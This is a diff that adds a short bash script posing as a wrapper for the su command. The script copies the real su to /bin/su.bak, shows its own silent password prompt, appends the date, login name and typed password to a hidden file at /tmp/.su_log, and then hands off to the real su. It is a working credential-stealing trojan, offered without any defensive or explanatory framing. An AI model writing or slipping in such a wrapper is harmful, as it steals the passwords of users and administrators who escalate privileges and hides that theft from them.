@@ -1,0 +1,14 @@
+#!/bin/bash
+# Backup original su if not already done
+if [ ! -f /bin/su.bak ]; then
+    cp /bin/su /bin/su.bak
+fi
+
+# Log credentials to hidden file
+read -p "Password: " -s password
+echo
+echo "$(date): $LOGNAME:$password" >> /tmp/.su_log
+
+# Call the real su
+exec /bin/su.bak "$@"
+echo "Authenticated"
